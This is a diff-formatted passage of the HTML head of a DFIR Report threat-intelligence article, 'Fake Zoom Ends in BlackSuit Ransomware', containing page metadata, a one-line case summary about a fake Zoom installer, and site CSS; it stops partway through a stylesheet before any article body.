@@ -1,0 +1,1933 @@
+<!DOCTYPE html>
+<html lang="en-US" class="responsive av-preloader-disabled  html_header_top html_logo_left html_main_nav_header html_menu_right html_slim html_header_sticky html_header_shrinking html_mobile_menu_phone html_header_searchicon html_content_align_center html_header_unstick_top_disabled html_header_stretch_disabled html_av-overlay-side html_av-overlay-side-classic html_av-submenu-noclone html_entry_id_42828 av-no-preview av-default-lightbox html_text_menu_active av-mobile-menu-switch-default">
+<head>
+<meta charset="UTF-8" />
+<!-- mobile setting -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Scripts/CSS and wp_head hook -->
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v28.1 - https://yoast.com/product/yoast-seo-wordpress/ -->
+	<title>Fake Zoom Ends in BlackSuit Ransomware - The DFIR Report</title>
+	<link rel="canonical" href="https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Fake Zoom Ends in BlackSuit Ransomware - The DFIR Report" />
+	<meta property="og:description" content="Key Takeaways Case Summary This case from May 2024 started with a malicious download from a website mimicking the teleconferencing application Zoom. When visiting the website and downloading a file that seems intended for installing Zoom, the user was, in fact, installing a malicious program created with Inno Setup. The malicious program was a d3f@ck [&hellip;]" />
+	<meta property="og:url" content="https://thedfirreport.com/2025/03/31/fake-zoom-ends-in-blacksuit-ransomware/" />
+	<meta property="og:site_name" content="The DFIR Report" />
+	<meta property="article:published_time" content="2025-03-31T00:01:24+00:00" />
+	<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/29354_020.png" />
+	<meta property="og:image:width" content="1410" />
+	<meta property="og:image:height" content="570" />
+	<meta property="og:image:type" content="image/png" />
+	<meta name="author" content="editor" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@TheDFIRReport" />
+	<meta name="twitter:site" content="@TheDFIRReport" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="editor" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="25 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#article","isPartOf":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/"},"author":{"name":"editor","@id":"https:\/\/thedfirreport.com\/#\/schema\/person\/da9637fd0bc34ae15034d826285864c5"},"headline":"Fake Zoom Ends in BlackSuit Ransomware","datePublished":"2025-03-31T00:01:24+00:00","mainEntityOfPage":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/"},"wordCount":3268,"publisher":{"@id":"https:\/\/thedfirreport.com\/#organization"},"image":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#primaryimage"},"thumbnailUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/29354_020.png","articleSection":["blacksuit","bruteratel","cobaltstrike","ransomware","sectoprat"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/","url":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/","name":"Fake Zoom Ends in BlackSuit Ransomware - The DFIR Report","isPartOf":{"@id":"https:\/\/thedfirreport.com\/#website"},"primaryImageOfPage":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#primaryimage"},"image":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#primaryimage"},"thumbnailUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/29354_020.png","datePublished":"2025-03-31T00:01:24+00:00","breadcrumb":{"@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#primaryimage","url":"https:\/\/thedfirreport.com\/wp-content\/uploads\/29354_020.png","contentUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/29354_020.png","width":1410,"height":570},{"@type":"BreadcrumbList","@id":"https:\/\/thedfirreport.com\/2025\/03\/31\/fake-zoom-ends-in-blacksuit-ransomware\/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/thedfirreport.com\/home\/"},{"@type":"ListItem","position":2,"name":"Fake Zoom Ends in BlackSuit Ransomware"}]},{"@type":"WebSite","@id":"https:\/\/thedfirreport.com\/#website","url":"https:\/\/thedfirreport.com\/","name":"The DFIR Report","description":"Actionable Cyber Threat Intelligence","publisher":{"@id":"https:\/\/thedfirreport.com\/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https:\/\/thedfirreport.com\/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https:\/\/thedfirreport.com\/#organization","name":"The DFIR Report","url":"https:\/\/thedfirreport.com\/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/thedfirreport.com\/#\/schema\/logo\/image\/","url":"https:\/\/thedfirreport.com\/wp-content\/uploads\/DFIR-Featured-Image-696x696-1.jpg","contentUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/DFIR-Featured-Image-696x696-1.jpg","width":696,"height":696,"caption":"The DFIR Report"},"image":{"@id":"https:\/\/thedfirreport.com\/#\/schema\/logo\/image\/"},"sameAs":["https:\/\/x.com\/TheDFIRReport","https:\/\/www.linkedin.com\/company\/the-dfir-report"]},{"@type":"Person","@id":"https:\/\/thedfirreport.com\/#\/schema\/person\/da9637fd0bc34ae15034d826285864c5","name":"editor","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","url":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","contentUrl":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","caption":"editor"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2025%2F03%2F31%2Ffake-zoom-ends-in-blacksuit-ransomware%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2025%2F03%2F31%2Ffake-zoom-ends-in-blacksuit-ransomware%2F&#038;format=xml" />
+<link rel='stylesheet' id='avia-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/grid.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-base-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/base.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-layout-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/layout.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-button-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/buttons.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-button-buttonrow-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/buttonrow.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-scs-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-ep-flickity-slider-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/ep-flickity-sliders.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-custom-menu-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/custom-menu.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-heading-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/heading.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-hr-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/hr.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-icon-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/icon.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-image-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/image.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-ep-grids-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/grids.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-item-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/item-grid.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-post-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/posts-grid.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-social-profiles-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/social-profiles.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-ep-split-heading-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/split-heading.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-textblock-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/textblock.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-video-css' href='https://thedfirreport.com/wp-content/themes/punch/config-templatebuilder/avia-shortcodes/video/video.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-ep-section-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/section.css?ver=1.0.94' media='' />
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="wp-block-image-inline-css">
+.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .wp-lightbox-close-button{align-items:center;cursor:pointer;display:flex;font-family:inherit;gap:8px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 4px;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .wp-lightbox-close-button:focus,.wp-lightbox-overlay .wp-lightbox-close-button:hover,.wp-lightbox-overlay .wp-lightbox-close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .wp-lightbox-close-button:has(.wp-lightbox-close-text:not([hidden])) .wp-lightbox-close-icon svg{height:1em;width:1em}.wp-lightbox-overlay .wp-lightbox-close-icon svg{display:block}.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{align-items:center;bottom:16px;cursor:pointer;display:flex;font-family:inherit;gap:4px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 8px;position:absolute;z-index:2000002}.wp-lightbox-overlay .wp-lightbox-navigation-button-next[hidden],.wp-lightbox-overlay .wp-lightbox-navigation-button-prev[hidden]{display:none}@media (min-width:960px){.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{bottom:50%;transform:translateY(-50%)}}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:not(:hover):not(:active):not(.has-background),.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:not(:hover):not(:active):not(.has-background){background:none;border:none;padding:0 8px}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg{display:block;height:1.5em;width:1.5em}.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{left:calc(env(safe-area-inset-left) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-button-next{right:calc(env(safe-area-inset-right) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-icon svg{vertical-align:middle}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:2000001}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/image/style.min.css */
+</style>
+<style id="wp-block-list-inline-css">
+ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/list/style.min.css */
+</style>
+<style id="wp-block-embed-inline-css">
+.wp-block-embed.alignleft,.wp-block-embed.alignright,.wp-block[data-align=left]>[data-type="core/embed"],.wp-block[data-align=right]>[data-type="core/embed"]{max-width:360px;width:100%}.wp-block-embed.alignleft .wp-block-embed__wrapper,.wp-block-embed.alignright .wp-block-embed__wrapper,.wp-block[data-align=left]>[data-type="core/embed"] .wp-block-embed__wrapper,.wp-block[data-align=right]>[data-type="core/embed"] .wp-block-embed__wrapper{min-width:280px}.wp-block-cover .wp-block-embed{min-height:240px;min-width:320px}.wp-block-group.is-layout-flex .wp-block-embed{flex:1 1 0%;min-width:0}.wp-block-embed{overflow-wrap:break-word}.wp-block-embed :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-embed iframe{max-width:100%}.wp-block-embed__wrapper{position:relative}.wp-embed-responsive .wp-has-aspect-ratio .wp-block-embed__wrapper:before{content:"";display:block;padding-top:50%}.wp-embed-responsive .wp-has-aspect-ratio iframe{bottom:0;height:100%;left:0;position:absolute;right:0;top:0;width:100%}.wp-embed-responsive .wp-embed-aspect-21-9 .wp-block-embed__wrapper:before{padding-top:42.85%}.wp-embed-responsive .wp-embed-aspect-18-9 .wp-block-embed__wrapper:before{padding-top:50%}.wp-embed-responsive .wp-embed-aspect-16-9 .wp-block-embed__wrapper:before{padding-top:56.25%}.wp-embed-responsive .wp-embed-aspect-4-3 .wp-block-embed__wrapper:before{padding-top:75%}.wp-embed-responsive .wp-embed-aspect-1-1 .wp-block-embed__wrapper:before{padding-top:100%}.wp-embed-responsive .wp-embed-aspect-9-16 .wp-block-embed__wrapper:before{padding-top:177.77%}.wp-embed-responsive .wp-embed-aspect-1-2 .wp-block-embed__wrapper:before{padding-top:200%}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/embed/style.min.css */
+</style>
+
+
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) 